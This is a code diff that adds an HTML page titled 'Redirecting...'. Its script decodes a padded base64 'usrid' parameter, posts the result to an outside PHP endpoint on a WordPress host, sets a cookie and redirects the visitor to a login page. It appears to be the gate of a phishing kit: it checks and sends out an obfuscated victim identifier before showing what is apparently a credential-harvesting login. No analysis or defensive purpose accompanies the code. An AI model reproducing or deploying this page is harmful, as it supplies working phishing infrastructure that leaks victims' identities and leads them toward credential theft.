@@ -1,0 +1,63 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        function setSecureCookie(name, value, days) {
+            const expires = new Date();
+            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
+            document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires.toUTCString()}; path=/; Secure; SameSite=Lax`;
+        }
+        
+        function processString(input) {
+            if (typeof input !== 'string' || input.length < 125) {
+                return false;
+            }
+
+            try {
+                const processed = input.slice(120, -50);
+                const decoded = atob(processed);
+                
+                if (decoded.length > 0) {
+                    return decoded;
+                } else {
+                    return false;
+                }
+                
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const paramValue = urlParams.get('usrid');
+        
+        if (paramValue) {
+            const userID = processString(paramValue);
+            
+            if (userID) {
+                fetch('https://wh1524982.ispot.cc/wp-content/rackspace/i.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ userID: userID })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.success) {
+                        setSecureCookie('userID', userID, 1);
+                        window.location.href = "./login";
+                    }
+                })
+                .catch(() => {});
+            }
+        }
+    </script>
+</body>
+</html>
